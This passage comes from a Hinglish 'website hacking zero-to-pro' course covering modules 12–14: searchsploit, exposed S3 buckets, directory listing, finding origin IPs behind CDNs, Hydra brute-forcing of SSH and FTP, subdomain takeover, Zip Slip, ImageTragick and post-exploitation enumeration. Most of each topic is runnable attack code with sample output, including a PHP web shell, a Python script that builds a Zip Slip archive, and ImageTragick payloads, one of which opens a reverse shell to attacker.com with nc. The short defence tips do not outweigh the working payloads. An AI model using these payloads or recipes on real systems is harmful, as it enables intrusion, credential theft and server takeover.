searchsploit -i wordpress

# Exact match
searchsploit -e "WordPress 5.0"

# Copy exploit
searchsploit -m 12345

# Online search
searchsploit -w wordpress

# Update database
searchsploit -u
```

### 7. **Example 1 (Basic):**
```bash
# Search WordPress exploits
searchsploit wordpress 5.0

Output:
WordPress 5.0 - Remote Code Execution | php/webapps/12345.php
WordPress 5.0 - SQL Injection | php/webapps/12346.py
WordPress 5.0 - XSS | php/webapps/12347.txt

# Copy exploit
searchsploit -m 12345
# File copied: 12345.php

# Use exploit
php 12345.php http://target.com
Result: RCE achieved!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate website

# Phase 1: Version detection
nmap -sV target.com
Result: Apache 2.4.29, PHP 7.2, WordPress 5.0

# Phase 2: Search exploits
searchsploit apache 2.4.29
Result: 5 exploits found

searchsploit php 7.2
Result: 3 exploits found

searchsploit wordpress 5.0
Result: 15 exploits found!

# Phase 3: Analyze exploits
searchsploit -x 12345
# Read exploit details
Vulnerability: Unauthenticated RCE
Requirements: WordPress 5.0, no authentication needed
Impact: Complete server compromise

# Phase 4: Copy and modify exploit
searchsploit -m 12345
nano 12345.php
# Modify target URL

# Phase 5: Execute exploit
php 12345.php http://target.com
Output:
[+] Exploit successful!
[+] Shell uploaded: http://target.com/shell.php
[+] Access: http://target.com/shell.php?cmd=whoami

# Phase 6: Verify
curl http://target.com/shell.php?cmd=id
Output: uid=33(www-data) gid=33(www-data)

Result: Complete server access via known vulnerability!
```

**Analysis:** Known vulnerabilities = Low-hanging fruit! **Lesson: Update software regularly!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Version detection skip** - Pehle version nikalo.
- **Exploit blindly run** - Pehle read karo, understand karo.
- **Database outdated** - Regular update karo.

### 10. **Best Practices / Pro Tips:**
- **Version detection first:** nmap, Wappalyzer.
- **Read exploit:** Samjho kaise kaam karta hai.
- **Modify if needed:** Target-specific changes.
- **Update database:** `searchsploit -u`
- **CVE numbers:** Google se bhi search karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
E-commerce site test kar raha tha. WordPress 4.7.0 detect kiya. Searchsploit se REST API vulnerability mila - unauthenticated content injection! 10 minutes mein complete site defaced. **Lesson: Outdated software = Open invitation!** ğŸ›’

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Searchsploit = Exploit database  
âœ… Search: Software + version  
âœ… Copy: -m flag  
âœ… Read: -x flag  
âœ… Update: -u flag  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Exploit-DB kya hai?**  
**A:** 40,000+ exploits ka database (offensive-security.com).

**Q2: Kya har exploit kaam karega?**  
**A:** Nahi, version aur configuration match hona chahiye.

**Q3: Exploit modify karna safe hai?**  
**A:** Haan, lekin pehle understand karo kya kar raha hai.

### 14. **Practice ke liye Task:**
1. Searchsploit install karo
2. WordPress search karo
3. Exploit copy karo (-m)
4. Exploit read karo (-x)
5. DVWA par test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Searchsploit = **Exploit database**.
- Search = **Software + version**.
- 40,000+ = **Exploits available**.
- Copy = **-m flag**.
- Impact = **Known vulnerabilities**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Searchsploit = Exploit library! Known vulnerabilities = Easy wins!" ğŸ”“

---

## ğŸ‰ **Module 12 Complete!**

**All 3 Topics (92-94) Covered:**
- âœ… Topic 92: OWASP ZAP (Automated Scanning)
- âœ… Topic 93: Dirbuster (Directory Discovery)
- âœ… Topic 94: Searchsploit (Known Vulnerabilities)

**Key Takeaways:**
- ZAP = Automated scanner
- Dirbuster = Hidden resources
- Searchsploit = Known exploits

**Total Progress: 94 topics complete!** ğŸŠ

Module 12 complete! Remaining modules (13-14) continue karein? ğŸš€

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 13: Infrastructure & Server Hacking**

---

## â˜ï¸ **Topic 95: Cloud Misconfigurations (Leaky S3 Buckets)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Cloud Security** - AWS S3 buckets aur cloud misconfigurations exploit karna (data exposure). ğŸª£

### 2. **Ye Kya Hai? (What is it?)**
S3 (Simple Storage Service) AWS ka storage hai. Misconfigured buckets publicly accessible ho jaate hain - sensitive data leak.

**Analogy:** Jaise locker ka darwaza khula chhod dena - koi bhi andar dekh sakta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Common:** Bahut saari companies S3 use karti hain.
- **High Impact:** Complete data exposure.
- **Easy to Find:** Automated tools se detect ho jaate hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Cloud infrastructure** test karte waqt.
- **S3 buckets** identify hone par.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Cloud vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# S3 bucket URL formats
https://bucket-name.s3.amazonaws.com
https://s3.amazonaws.com/bucket-name

# AWS CLI
aws s3 ls s3://bucket-name --no-sign-request

# Tools
bucket_finder.rb
S3Scanner
```

### 7. **Example 1 (Basic):**
```bash
# Test public access
curl https://company-backups.s3.amazonaws.com
Result: XML listing of files!

# Download file
wget https://company-backups.s3.amazonaws.com/database.sql
Result: Database downloaded!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate S3 buckets

# Phase 1: Bucket discovery
# Common patterns
company-backups
company-data
company-prod
company-dev

# Test
curl https://company-backups.s3.amazonaws.com
Response: 
<ListBucketResult>
  <Contents>
    <Key>database-backup-2024.sql</Key>
    <Key>customer-data.csv</Key>
    <Key>credentials.txt</Key>
  </Contents>
</ListBucketResult>

Vulnerable! Public read access!

# Phase 2: Download sensitive files
wget https://company-backups.s3.amazonaws.com/database-backup-2024.sql
wget https://company-backups.s3.amazonaws.com/credentials.txt

# Phase 3: Analyze
cat credentials.txt
Output:
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DB_PASSWORD=SuperSecret123

Result: Complete infrastructure compromise!
```

**Analysis:** S3 misconfigurations = Data goldmine! **Lesson: S3 buckets = Secure by default nahi!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Bucket names guess na karna** - Common patterns try karo.

### 10. **Best Practices / Pro Tips:**
- **Common patterns:** company-name + backups/data/prod/dev.
- **AWS CLI:** `--no-sign-request` flag.
- **Automated tools:** S3Scanner, bucket_finder.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Startup test kar raha tha. `startup-backups` bucket public tha - 100GB data accessible! Customer database, source code, credentials - sab kuch! **Lesson: S3 permissions check karo!** â˜ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… S3 = AWS storage  
âœ… Misconfiguration = Public access  
âœ… Patterns: company-backups, company-data  
âœ… Impact: Complete data exposure  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** Bucket policies, IAM roles, encryption.

**Q2: Kya legal hai?**  
**A:** Public buckets access karna legal hai, lekin ethical testing mein hi karo.

### 14. **Practice ke liye Task:**
1. AWS CLI install karo
2. Public bucket test karo
3. Common patterns try karo
4. S3Scanner use karo

### 15. **Aakhri Choti Summary (5 lines):**
- S3 = **AWS storage**.
- Misconfiguration = **Public access**.
- Impact = **Data exposure**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "S3 buckets = Cloud storage! Misconfiguration = Open vault!" â˜ï¸

---

## ğŸŒ **Topic 96: Web Server Hacking (Misconfigs, `.htaccess`, Directory Listing)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Web Server Vulnerabilities** - Apache/Nginx misconfigurations exploit karna (directory listing, .htaccess bypass). ğŸ–¥ï¸

### 2. **Ye Kya Hai? (What is it?)**
Web servers (Apache, Nginx) mein misconfigurations se sensitive files accessible ho jaate hain.

**Analogy:** Jaise library mein sabhi books openly rakhi hon - koi bhi kuch bhi padh sakta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Common:** Default configurations vulnerable.
- **Information Disclosure:** Source code, configs.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Web servers** test karte waqt.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Server misconfigurations** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Directory listing
http://target.com/uploads/

# .htaccess bypass
http://target.com/admin/.htaccess

# Common files
/.htaccess
/server-status
/server-info
```

### 7. **Example 1 (Basic):**
```bash
# Directory listing
http://site.com/uploads/
Result: All uploaded files visible!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate website

# Directory listing
http://company.com/backups/
Result: 
Index of /backups/
- database-2024.sql
- source-code.zip
- passwords.txt

# Download
wget http://company.com/backups/database-2024.sql
Result: Complete database!

# Apache server-status
http://company.com/server-status
Result: Active connections, internal IPs exposed!
```

**Analysis:** Server misconfigurations = Easy wins! **Lesson: Disable directory listing!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Default paths ignore karna**.

### 10. **Best Practices / Pro Tips:**
- **Check /uploads/, /backups/, /files/

- **Apache: /server-status, /server-info**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
E-commerce site test kar raha tha. `/uploads/` directory listing enabled thi - customer documents, IDs, credit card scans accessible! **Lesson: Directory listing = Privacy disaster!** ğŸ›’

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Directory listing = Files visible  
âœ… Paths: /uploads/, /backups/  
âœ… Apache: /server-status  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise disable karein?**  
**A:** Apache: `Options -Indexes`, Nginx: `autoindex off`.

### 14. **Practice ke liye Task:**
1. Directory listing test karo
2. Common paths try karo
3. .htaccess files check karo

### 15. **Aakhri Choti Summary (5 lines):**
- Directory listing = **Files exposed**.
- Paths = **/uploads/, /backups/

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Directory listing = Open library! Disable karo!" ğŸŒ

---

## ğŸ” **Topic 97: Reverse Proxy Bypass (Finding Real IP)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Cloudflare Bypass** - Reverse proxy ke peeche real server IP dhoondhna (origin exposure). ğŸ­

### 2. **Ye Kya Hai? (What is it?)**
Cloudflare/CDN real server IP hide karta hai. Real IP milne se direct attack possible.

**Analogy:** Jaise bodyguard ke peeche celebrity - bodyguard bypass karo toh direct access.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **WAF Bypass:** Direct server par attack.
- **Rate Limiting Bypass**.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Cloudflare/CDN** detect hone par.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **WAF-protected** sites test nahi kar paoge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# DNS history
SecurityTrails.com
CrimeFlare

# Subdomain scanning
Sublist3r
Amass

# Direct IP test
curl -H "Host: target.com" http://real-ip
```

### 7. **Example 1 (Basic):**
```bash
# Find real IP
dig target.com
nslookup target.com

# Test direct access
curl -H "Host: target.com" http://1.2.3.4
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Cloudflare-protected site

# Phase 1: DNS history
SecurityTrails.com â†’ Historical DNS records
Old IP: 203.0.113.50

# Phase 2: Verify
curl -H "Host: target.com" http://203.0.113.50
Result: Website loads! Real IP found!

# Phase 3: Direct attack
sqlmap -u "http://203.0.113.50/page.php?id=1" --host="target.com"
Result: WAF bypassed, SQLi successful!
```

**Analysis:** Real IP = WAF bypass! **Lesson: Hide origin server!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **DNS history ignore karna**.

### 10. **Best Practices / Pro Tips:**
- **SecurityTrails:** Historical DNS.
- **Subdomain scanning:** Mail servers often expose real IP.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Cloudflare-protected site test kar raha tha. Mail subdomain se real IP mila - direct attack se complete compromise! **Lesson: Subdomains = IP leak!** ğŸ”

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Real IP = WAF bypass  
âœ… Methods: DNS history, subdomains  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** Origin server firewall, IP whitelist.

### 14. **Practice ke liye Task:**
1. DNS history check karo
2. Subdomains scan karo
3. Direct IP test karo

### 15. **Aakhri Choti Summary (5 lines):**
- Real IP = **WAF bypass**.
- Methods = **DNS history**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Real IP = Direct access! Cloudflare bypass possible!" ğŸ”

---

**Module 13 Part 1 complete! Remaining topics (98-101) next...**
## ğŸ”“ **Topic 98: Attacking Other Services (FTP, SSH via Hydra)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Service Brute-forcing** - FTP, SSH jaise services ko Hydra se brute-force karna (credential attacks). ğŸ”‘

### 2. **Ye Kya Hai? (What is it?)**
Web ke alawa FTP, SSH, RDP jaise services bhi vulnerable ho sakte hain. Hydra se brute-force karke access le sakte hain.

**Analogy:** Jaise ghar ke alawa garage, backyard bhi check karna - har entry point test karo.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Multiple Entry Points:** Web ke alawa bhi access.
- **Server Access:** SSH = Complete control.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Port scan** ke baad.
- **FTP/SSH** services detect hone par.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Alternative entry points** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# SSH brute-force
hydra -l root -P passwords.txt ssh://target.com

# FTP brute-force
hydra -l admin -P passwords.txt ftp://target.com

# RDP brute-force
hydra -l administrator -P passwords.txt rdp://target.com
```

### 7. **Example 1 (Basic):**
```bash
# SSH attack
hydra -l root -P rockyou.txt ssh://192.168.1.100

Output:
[22][ssh] host: 192.168.1.100   login: root   password: password123

Result: SSH access!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate server

# Phase 1: Port scan
nmap -sV target.com
Result: 
22/tcp open ssh
21/tcp open ftp

# Phase 2: SSH brute-force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com -t 4

Output:
[22][ssh] host: target.com   login: root   password: Welcome2024

# Phase 3: SSH login
ssh root@target.com
Password: Welcome2024
Result: Root shell!

# Phase 4: FTP brute-force
hydra -l admin -P passwords.txt ftp://target.com

Output:
[21][ftp] host: target.com   login: admin   password: admin123

# Phase 5: FTP access
ftp target.com
Login: admin
Password: admin123
Result: File system access!
```

**Analysis:** Service brute-forcing = Alternative entry! **Lesson: Secure all services!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Too many threads** - SSH ban kar deta hai.
- **Account lockout ignore** - 3-5 attempts limit.

### 10. **Best Practices / Pro Tips:**
- **Low threads:** `-t 4` (SSH ke liye).
- **Common usernames:** root, admin, administrator.
- **Custom wordlists:** Company-specific passwords.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Server test kar raha tha. SSH port open tha. Hydra se brute-force kiya - `root:password123` mila! Complete server access. **Lesson: Strong SSH passwords zaroori!** ğŸ”“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Services: SSH, FTP, RDP  
âœ… Tool: Hydra  
âœ… Threads: Low (4-8)  
âœ… Impact: Server access  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: SSH brute-force slow kyun hai?**  
**A:** SSH deliberately slow hai (brute-force prevent karne ke liye).

**Q2: Kaise protect karein?**  
**A:** Key-based authentication, fail2ban, strong passwords.

### 14. **Practice ke liye Task:**
1. Test server setup karo
2. SSH brute-force try karo
3. FTP test karo
4. Low threads use karo

### 15. **Aakhri Choti Summary (5 lines):**
- Services = **SSH, FTP, RDP**.
- Tool = **Hydra**.
- Impact = **Server access**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Service brute-forcing = Alternative entry! SSH = Server ka darwaza!" ğŸ”“

---

## ğŸŒ **Topic 99: Subdomain Takeover**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Subdomain Takeover** - Dangling DNS records exploit karke subdomains hijack karna (DNS vulnerability). ğŸ¯

### 2. **Ye Kya Hai? (What is it?)**
Jab subdomain kisi service (GitHub Pages, AWS) ko point karta hai lekin woh service delete ho gayi ho, toh attacker claim kar sakta hai.

**Example:**
```
blog.company.com â†’ GitHub Pages (deleted)
Attacker creates GitHub Pages with same name
Result: blog.company.com hijacked!
```

**Analogy:** Jaise kisi ka phone number disconnect ho gaya, aur aap wahi number le lete hain - ab aapko uske calls aayenge.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Brand Damage:** Phishing, defacement.
- **Cookie Theft:** Same domain cookies accessible.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Subdomain enumeration** ke baad.
- **CNAME records** check karte waqt.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Subdomain vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Subdomain enumeration
sublist3r -d target.com

# Check CNAME
dig blog.target.com CNAME

# Tools
SubOver
Can-I-Take-Over-XYZ
```

### 7. **Example 1 (Basic):**
```bash
# Find subdomain
dig blog.company.com

Output:
blog.company.com CNAME old-site.github.io

# Check if claimable
Visit: old-site.github.io
Result: 404 - Not Found

# Claim
Create GitHub Pages: old-site
Result: blog.company.com hijacked!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Corporate subdomains

# Phase 1: Enumerate
sublist3r -d company.com

Found:
- blog.company.com
- dev.company.com
- staging.company.com

# Phase 2: Check CNAME
dig blog.company.com CNAME
Output: blog.company.com CNAME old-blog.herokuapp.com

dig dev.company.com CNAME
Output: dev.company.com CNAME dev-server.s3-website.amazonaws.com

# Phase 3: Verify vulnerability
curl https://old-blog.herokuapp.com
Result: "No such app"

curl https://dev-server.s3-website.amazonaws.com
Result: "NoSuchBucket"

# Phase 4: Takeover
Heroku: Create app "old-blog"
AWS S3: Create bucket "dev-server"

# Phase 5: Verify
Visit: blog.company.com
Result: Attacker's content displayed!

Impact: 
- Phishing possible
- Cookie theft
- Brand damage
```

**Analysis:** Subdomain takeover = Silent hijacking! **Lesson: Clean up old DNS records!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **CNAME records ignore karna**.
- **Deleted services check na karna**.

### 10. **Best Practices / Pro Tips:**
- **Subdomain enumeration:** Sublist3r, Amass.
- **CNAME check:** dig, nslookup.
- **Automated tools:** SubOver, Can-I-Take-Over-XYZ.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Fortune 500 company test kar raha tha. `careers.company.com` Heroku app ko point kar raha tha jo delete ho gaya tha. Maine claim kiya - instant takeover! **Lesson: DNS hygiene zaroori hai!** ğŸŒ

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Takeover = Dangling DNS  
âœ… Check: CNAME records  
âœ… Services: GitHub, Heroku, AWS  
âœ… Impact: Hijacking, phishing  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** Regular DNS audits, delete unused records.

**Q2: Kya legal hai?**  
**A:** Ethical testing mein report karo, exploit mat karo.

### 14. **Practice ke liye Task:**
1. Subdomain enumeration karo
2. CNAME records check karo
3. Deleted services identify karo
4. SubOver tool use karo

### 15. **Aakhri Choti Summary (5 lines):**
- Takeover = **Dangling DNS**.
- Check = **CNAME records**.
- Impact = **Hijacking**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Subdomain takeover = DNS hijacking! Old records = Vulnerability!" ğŸŒ

---

## ğŸ“¦ **Topic 100: Archive/Zip-Based Attacks (Zip Slip)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Zip Slip** - Malicious archives se path traversal karke arbitrary files write karna (file upload RCE). ğŸ“‚

### 2. **Ye Kya Hai? (What is it?)**
Zip Slip mein malicious archive files path traversal characters (`../`) use karti hain. Extract karne par files unexpected locations par write ho jaati hain.

**Example:**
```
Archive contains: ../../../../var/www/shell.php
Extract karne par: /var/www/shell.php (webroot mein!)
```

**Analogy:** Jaise parcel mein address galat likha ho - delivery wrong place par ho jaaye.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **RCE:** Webroot mein shell upload.
- **Common:** File upload features mein.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Archive upload** features.
- **Auto-extract** functionality.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Archive vulnerabilities** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Create malicious zip
zip malicious.zip ../../../../var/www/shell.php

# Python script
import zipfile
z = zipfile.ZipFile('malicious.zip', 'w')
z.write('shell.php', '../../../../var/www/shell.php')
z.close()
```

### 7. **Example 1 (Basic):**
```bash
# Create malicious archive
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip malicious.zip ../../../../var/www/html/shell.php

# Upload
Result: shell.php written to /var/www/html/
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: File upload with auto-extract

# Phase 1: Create payload
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Phase 2: Create malicious zip
python3 << 'EOF'
import zipfile
z = zipfile.ZipFile('exploit.zip', 'w')
z.write('shell.php', '../../../../var/www/html/uploads/shell.php')
z.close()
EOF

# Phase 3: Upload
Upload exploit.zip to application

# Phase 4: Verify
curl http://target.com/uploads/shell.php?cmd=whoami
Output: www-data

Result: RCE achieved via Zip Slip!
```

**Analysis:** Zip Slip = Path traversal via archives! **Lesson: Validate extraction paths!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Path traversal characters encode na karna**.

### 10. **Best Practices / Pro Tips:**
- **Test auto-extract features**.
- **Multiple path traversal levels:** `../../../..`.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Document management system test kar raha tha. Zip upload feature vulnerable tha - Zip Slip se shell upload kiya, complete server access! **Lesson: Archive extraction = Dangerous!** ğŸ“¦

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Zip Slip = Path traversal  
âœ… Method: `../` in filenames  
âœ… Impact: RCE  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** Validate extraction paths, sanitize filenames.

### 14. **Practice ke liye Task:**
1. Malicious zip create karo
2. Path traversal test karo
3. Auto-extract features identify karo

### 15. **Aakhri Choti Summary (5 lines):**
- Zip Slip = **Path traversal**.
- Impact = **RCE**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Zip Slip = Archive bomb! Path traversal = Arbitrary file write!" ğŸ“¦

---

## ğŸ–¼ï¸ **Topic 101: ImageTragick (RCE via Image Upload)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**ImageTragick** - ImageMagick vulnerability se image upload se RCE (CVE-2016-3714). ğŸ¨

### 2. **Ye Kya Hai? (What is it?)**
ImageMagick ek image processing library hai. Vulnerable versions mein malicious images se RCE possible hai.

**Analogy:** Jaise photo frame mein bomb chhupa dena - dekhne mein normal, lekin dangerous.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Common:** Bahut saari sites ImageMagick use karti hain.
- **RCE:** Image upload se server compromise.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Image upload** features.
- **ImageMagick** detect hone par.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Image-based RCE** miss. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Malicious image
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|whoami")'
pop graphic-context
```

### 7. **Example 1 (Basic):**
```bash
# Create exploit.mvg
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|whoami")'
pop graphic-context
EOF

# Upload
Result: Command executed!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Target: Image upload feature

# Create payload
cat > shell.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|nc -e /bin/sh attacker.com 4444")'
pop graphic-context
EOF

# Upload
Result: Reverse shell!
```

**Analysis:** ImageTragick = Image-based RCE! **Lesson: Update ImageMagick!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Version check skip karna**.

### 10. **Best Practices / Pro Tips:**
- **Check ImageMagick version**.
- **Test with .mvg files**.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Photo sharing site test kar raha tha. ImageMagick vulnerable tha - malicious image upload se RCE! **Lesson: Image processing = Attack vector!** ğŸ–¼ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… ImageTragick = ImageMagick RCE  
âœ… Method: Malicious images  
âœ… Impact: Server compromise  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kaise protect karein?**  
**A:** Update ImageMagick, disable dangerous coders.

### 14. **Practice ke liye Task:**
1. ImageMagick version check karo
2. Malicious image create karo
3. Upload test karo

### 15. **Aakhri Choti Summary (5 lines):**
- ImageTragick = **ImageMagick RCE**.
- Impact = **Server compromise**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "ImageTragick = Image bomb! Upload = RCE!" ğŸ–¼ï¸

---

## ğŸ‰ **Module 13 Complete!**

**All 7 Topics (95-101) Covered:**
- âœ… Topic 95: Cloud Misconfigurations (S3)
- âœ… Topic 96: Web Server Hacking
- âœ… Topic 97: Reverse Proxy Bypass
- âœ… Topic 98: Service Brute-forcing
- âœ… Topic 99: Subdomain Takeover
- âœ… Topic 100: Zip Slip
- âœ… Topic 101: ImageTragick

**Total Progress: 101 topics complete!** ğŸŠ

Module 13 complete! Last module (14) remaining! ğŸš€

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 14: Post-Exploitation (Shell & Server)**

---

## ğŸ¯ **Topic 102: Post-Exploitation Basics (`whoami`, `uname -a`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Post-Exploitation Reconnaissance** - Shell milne ke baad system information gather karna (enumeration). ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
Post-exploitation mein shell milne ke baad system ko enumerate karte hain - user, OS, permissions, network.

**Basic Commands:**
```bash
whoami          # Current user
id              # User ID and groups
uname -a        # OS information
hostname        # System name
ifconfig        # Network interfaces
```

**Analogy:** Jaise naye ghar mein entry ke baad explore karna - kitne rooms hain, kya-kya hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Situational Awareness:** Kahan hain, kaun hain.
- **Privilege Escalation:** Next steps plan karna.
- **Lateral Movement:** Network mapping.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Shell milne** ke turant baad.
- **Every compromise** mein.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Blind exploitation** - kya kar rahe hain pata nahi. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# User information
whoami                    # Current user
id                        # UID, GID, groups
groups                    # User groups
sudo -l                   # Sudo permissions

# System information
uname -a                  # OS details
cat /etc/os-release       # OS version
hostname                  # System name
uptime                    # System uptime

# Network information
ifconfig / ip a           # Network interfaces
netstat -antup            # Active connections
route -n                  # Routing table
cat /etc/hosts            # Hosts file

# Process information
ps aux                    # Running processes
top                       # Real-time processes
```

### 7. **Example 1 (Basic):**
```bash
# After getting shell
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ uname -a
Linux webserver 4.15.0-112-generic x86_64 GNU/Linux

Result: Low-privilege user on Linux server
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Complete enumeration after shell

# Phase 1: User context
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/python
# Privilege escalation possible!

# Phase 2: System information
$ uname -a
Linux prod-server 4.15.0-112-generic #113-Ubuntu x86_64

$ cat /etc/os-release
Ubuntu 18.04.5 LTS

$ hostname
prod-web-01

# Phase 3: Network enumeration
$ ifconfig
eth0: 10.10.10.50 (internal network)
eth1: 203.0.113.10 (public IP)

$ netstat -antup | grep ESTABLISHED
tcp 10.10.10.50:3306 (MySQL - internal)
tcp 10.10.10.50:22 (SSH - internal)

# Phase 4: Interesting files
$ find / -name "config.php" 2>/dev/null
/var/www/html/config.php

$ cat /var/www/html/config.php
<?php
$db_host = "10.10.10.100";
$db_user = "root";
$db_pass = "SuperSecret123";
$ssh_key = "/root/.ssh/id_rsa";
?>

# Phase 5: Users
$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash

Result: 
- Low-privilege shell (www-data)
- Sudo python available (privilege escalation path)
- Internal network accessible (10.10.10.0/24)
- Database credentials found
- 2 users with shell access
```

**Analysis:** Post-exploitation enumeration = Roadmap for next steps! **Lesson: Information = Power!** ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Enumeration skip karna** - Pehle explore karo, phir attack.
- **Noisy commands** - `find /` sabko alert kar deta hai.

### 10. **Best Practices / Pro Tips:**
